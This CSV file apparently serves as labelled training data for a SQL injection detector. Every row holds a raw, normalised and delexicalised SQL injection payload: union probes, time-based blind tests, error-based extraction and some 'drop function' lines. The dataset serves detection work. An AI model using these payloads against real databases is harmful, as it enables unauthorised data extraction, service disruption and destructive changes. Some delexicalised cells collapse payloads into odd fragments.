payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
1'  )   where 1363  =  1363,1' ) where 1363 = 1363,<NUM>' ) where <NUM> = <NUM>,1,False,,sqli_dataset
"1  )   union all select null,null,null,null,null,null,null,null,null--","1 ) union all select null,null,null,null,null,null,null,null,null--","<NUM> ) union all select null,null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1'   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   'wqme'  =  'wqme","1' ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 'wqme' = 'wqme",<NUM><STR>wqme<STR>wqme,1,True,,sqli_dataset
"1""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""gimc"" like ""gimc","1"" ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""gimc"" like ""gimc",<NUM><STR>gimc<STR>gimc,1,False,,sqli_dataset
"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#","-4373'+ ( select 'rlht' where 2285 = 2285 union all select 2285,2285,2285#","-<NUM><STR>rlht' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>#",1,True,,sqli_dataset
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) -- paxv,<NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) ydpu ) -- paxv,1,False,,sqli_dataset
"1' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1' or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --","<NUM>' or <NUM> = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,False,,sqli_dataset
"1"" rlike   (  select   (  case when   (  2724  =  4757  )   then 1 else 0x28 end   )    )    and ""cmsa""  =  ""cmsa","1"" rlike ( select ( case when ( 2724 = 4757 ) then 1 else 0x28 end ) ) and ""cmsa"" = ""cmsa",<NUM><STR>cmsa<STR>cmsa,1,True,,sqli_dataset
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw","select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'lckw' = 'lckw","select dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) from dual and <STR> = 'lckw",1,False,,sqli_dataset
"1""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""kcxw""  =  ""kcxw","1"" ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""kcxw"" = ""kcxw",<NUM><STR>kcxw<STR>kcxw,1,False,,sqli_dataset
1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ),1 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ),<NUM> rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ),1,True,,sqli_dataset
"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#","-1891' in boolean mode ) union all select 6680,6680,6680,6680,6680,6680,6680,6680#","-<NUM>' in boolean mode ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  ""","1%"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--","1"" ) ) as frsd where 6475 = 6475 union all select null,null,null,null,null,null,null,null,null,null--","<NUM>"" ) ) as frsd where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
if  (  3831  =  9321  )   select 3831 else drop function ybru--,if ( 3831 = 9321 ) select 3831 else drop function ybru--,if ( <NUM> = <NUM> ) select <NUM> else drop function ybru--,1,False,,sqli_dataset
"1""  )   where 9861  =  9861","1"" ) where 9861 = 9861","<NUM>"" ) where <NUM> = <NUM>",1,False,,sqli_dataset
if  (  3490  =  4920  )   select 3490 else drop function hlzt--,if ( 3490 = 4920 ) select 3490 else drop function hlzt--,if ( <NUM> = <NUM> ) select <NUM> else drop function hlzt--,1,False,,sqli_dataset
"1  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )","1 ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )","<NUM> ) or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",1,False,,sqli_dataset
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""pqsp""  =  ""pqsp","1"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""pqsp"" = ""pqsp",<NUM><STR>pqsp<STR>pqsp,1,False,,sqli_dataset
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg","select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg","select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",1,False,,sqli_dataset
"1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#","1' ) where 3262 = 3262 union all select null,null,null,null,null,null,null,null,null,null#","<NUM>' ) where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
-2573   )    )    order by 1#,-2573 ) ) order by 1#,-<NUM> ) ) order by <NUM>#,1,False,,sqli_dataset
"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#","-2027%"" ) union all select 2048,2048,2048,2048,2048,2048,2048,2048#","-<NUM>%"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
1 where 3354  =  3354,1 where 3354 = 3354,<NUM> where <NUM> = <NUM>,1,False,,sqli_dataset
"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""dtfg""  =  ""dtfg","1"" ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ""dtfg"" = ""dtfg",<NUM><STR>dtfg<STR>dtfg,1,True,,sqli_dataset
"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--","-3853"" ) where 4626 = 4626 union all select 4626,4626,4626--","-<NUM>"" ) where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'+  (  select 'vwzp' where 2729  =  2729 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --","<NUM><STR>vwzp' where <NUM> = <NUM> or <NUM> = dbms_pipe.receive_message ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ,<NUM> ) --",1,True,,sqli_dataset
"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar","1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",<NUM><STR>ioar<STR>ioar,1,False,,sqli_dataset
-3096' or 3821  =  5539 and 'zrth'  =  'zrth,-3096' or 3821 = 5539 and 'zrth' = 'zrth,-<NUM><STR>zrth<STR>zrth,1,False,,sqli_dataset
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) # lwfs,<NUM> or ( select * from ( select ( sleep ( <NUM> ) ) ) ydpu ) # lwfs,1,False,,sqli_dataset
"1 union all select null,null,null,null,null,null,null,null,null--","1 union all select null,null,null,null,null,null,null,null,null--","<NUM> union all select null,null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  # msrb","1 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb","<NUM> or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) # msrb",1,False,,sqli_dataset
"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep","1' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'ulep' = 'ulep",<NUM><STR>ulep<STR>ulep,1,True,,sqli_dataset
"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb","-5230"" ) or elt ( 1032 = 1032,3623 ) and ( ""aivb"" like ""aivb",-<NUM><STR>aivb<STR>aivb,1,False,,sqli_dataset
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'nbzf' like 'nbzf,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf,( select * from ( select ( sleep ( <NUM> ) ) ) srmq ) and ( ( <STR> like 'nbzf,1,False,,sqli_dataset
"-8349  )   union all select 8126,8126#","-8349 ) union all select 8126,8126#","-<NUM> ) union all select <NUM>,<NUM>#",1,False,,sqli_dataset
"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --","1"" ) as buky where 7898 = 7898 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","<NUM>"" ) as buky where <NUM> = <NUM> or <NUM> = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,False,,sqli_dataset
"1""  )   where 4567  =  4567 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1"" ) where 4567 = 4567 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM>"" ) where <NUM> = <NUM> or <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
"1"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )","1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","<NUM>"" and <NUM> = ( select upper ( xmltype ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) from dual )",1,False,,sqli_dataset
"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'rxxb'  =  'rxxb","1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'rxxb' = 'rxxb",<NUM><STR>rxxb<STR>rxxb,1,True,,sqli_dataset
1  )   where 2232  =  2232,1 ) where 2232 = 2232,<NUM> ) where <NUM> = <NUM>,1,False,,sqli_dataset
"-3637"" or   (  8459  =  8459  )  *4906","-3637"" or ( 8459 = 8459 ) *4906","-<NUM>"" or ( <NUM> = <NUM> ) *<NUM>",1,False,,sqli_dataset
1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,<NUM>' ) ) ) and <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --,1,False,,sqli_dataset
"1'   )    )    as xntz where 5801  =  5801 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --","1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --","<NUM>' ) ) as xntz where <NUM> = <NUM> or row ( <NUM>,<NUM> ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,floor ( rand ( <NUM> ) *<NUM> ) ) x from ( select <NUM> union select <NUM> union select <NUM> union select <NUM> ) a group by x ) --",1,True,,sqli_dataset
"iif  (  2452  =  8999,1,1/0  )","iif ( 2452 = 8999,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )",1,False,,sqli_dataset
1'  )   as bihs where 4197  =  4197,1' ) as bihs where 4197 = 4197,<NUM>' ) as bihs where <NUM> = <NUM>,1,False,,sqli_dataset
"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--","-7531' ) union all select 3072,3072,3072,3072,3072,3072,3072--","-<NUM>' ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1   )    )     )   union all select null,null,null,null,null,null--","1 ) ) ) union all select null,null,null,null,null,null--","<NUM> ) ) ) union all select null,null,null,null,null,null--",1,False,,sqli_dataset
"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp","waitfor delay '0:0:5' and ( ""ludp"" like ""ludp","waitfor delay <STR> and ( <STR> like ""ludp",1,False,,sqli_dataset
1  )   where 7680  =  7680 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1 ) where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,<NUM> ) where <NUM> = <NUM> and <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --,1,False,,sqli_dataset
1'||  (  select 'fwph' where 3791  =  3791,1'|| ( select 'fwph' where 3791 = 3791,<NUM><STR>fwph' where <NUM> = <NUM>,1,False,,sqli_dataset
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'xtdj'  =  'xtdj","1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'xtdj' = 'xtdj",<NUM><STR>xtdj<STR>xtdj,1,True,,sqli_dataset
-2981   )    )    or   (  8459  =  8459  )  *4906 and    (    (   4202  =  4202,-2981 ) ) or ( 8459 = 8459 ) *4906 and ( ( 4202 = 4202,-<NUM> ) ) or ( <NUM> = <NUM> ) *<NUM> and ( ( <NUM> = <NUM>,1,False,,sqli_dataset
1'||  (  select 'tvcy' where 5592  =  5592 order by 1#,1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,<NUM><STR>tvcy' where <NUM> = <NUM> order by <NUM>#,1,False,,sqli_dataset
"-5320 where 8051  =  8051 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --","-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --","-<NUM> where <NUM> = <NUM> or <NUM> = ctxsys.drithsx.sn ( <NUM>, ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --",1,False,,sqli_dataset
"1%'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '","1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1 where 5691  =  5691 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1 where 5691 = 5691 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,<NUM> where <NUM> = <NUM> and ( select * from ( select ( sleep ( <NUM> ) ) ) fzno ) --,1,False,,sqli_dataset
"select sleep  (  5  )   and ""cyrb""  =  ""cyrb","select sleep ( 5 ) and ""cyrb"" = ""cyrb","select sleep ( <NUM> ) and <STR> = ""cyrb",1,False,,sqli_dataset
1'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'jhlj'  =  'jhlj,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'jhlj' = 'jhlj,<NUM><STR>jhlj<STR>jhlj,1,False,,sqli_dataset
1  )   as oknr where 3228  =  3228,1 ) as oknr where 3228 = 3228,<NUM> ) as oknr where <NUM> = <NUM>,1,False,,sqli_dataset
"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg","1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg",<NUM><STR>eefg<STR>eefg,1,False,,sqli_dataset
"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --","1"" ) as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --","<NUM>"" ) as gtpi where <NUM> = <NUM> and make_set ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue","1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""lxue"" like ""lxue",<NUM><STR>lxue<STR>lxue,1,False,,sqli_dataset
"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#","-8490 ) ) union all select 6910,6910,6910,6910,6910,6910#","-<NUM> ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1   )    )     )   union all select null,null,null,null,null,null,null--","1 ) ) ) union all select null,null,null,null,null,null,null--","<NUM> ) ) ) union all select null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1"" union all select null,null,null,null--","1"" union all select null,null,null,null--","<NUM>"" union all select null,null,null,null--",1,False,,sqli_dataset
"1   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  9558  =  9558","1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558","<NUM> ) ) ) or elt ( <NUM> = <NUM>,sleep ( <NUM> ) ) and ( ( ( <NUM> = <NUM>",1,False,,sqli_dataset
"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb","1"" ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""jzsb"" = ""jzsb",<NUM><STR>jzsb<STR>jzsb,1,False,,sqli_dataset
select case when 1892  =  3646 then 1 else null end--,select case when 1892 = 3646 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--,1,False,,sqli_dataset
"-7416"" where 7656  =  7656 order by 1--","-7416"" where 7656 = 7656 order by 1--","-<NUM>"" where <NUM> = <NUM> order by <NUM>--",1,False,,sqli_dataset
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""tbbk"" like ""tbbk","1"" rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ""tbbk"" like ""tbbk",<NUM><STR>tbbk<STR>tbbk,1,True,,sqli_dataset
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",1,False,,sqli_dataset
"-6747"" or 9323  =  9323#","-6747"" or 9323 = 9323#","-<NUM>"" or <NUM> = <NUM>#",1,False,,sqli_dataset
-1219'  )   or 5592  =  4835,-1219' ) or 5592 = 4835,-<NUM>' ) or <NUM> = <NUM>,1,False,,sqli_dataset
"1""   )    )     )   union all select null,null,null,null,null#","1"" ) ) ) union all select null,null,null,null,null#","<NUM>"" ) ) ) union all select null,null,null,null,null#",1,False,,sqli_dataset
"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'cjre'  =  'cjre","1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre",<NUM><STR>cjre<STR>cjre,1,False,,sqli_dataset
"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#","-8566"" ) as hnch where 3418 = 3418 union all select 3418,3418,3418,3418,3418,3418,3418#","-<NUM>"" ) as hnch where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
